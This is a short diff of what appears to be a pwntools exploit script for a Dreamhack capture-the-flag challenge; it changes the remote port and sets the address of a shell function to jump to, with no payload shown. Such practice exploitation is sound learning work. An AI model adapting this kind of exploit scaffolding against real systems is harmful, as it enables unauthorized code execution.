@@ -1,7 +1,7 @@
 from pwn import *
   
 
-port = 12100
+port = 22292
 rem = remote("host3.dreamhack.games", port)
 
 shell_address = 0x80486b9
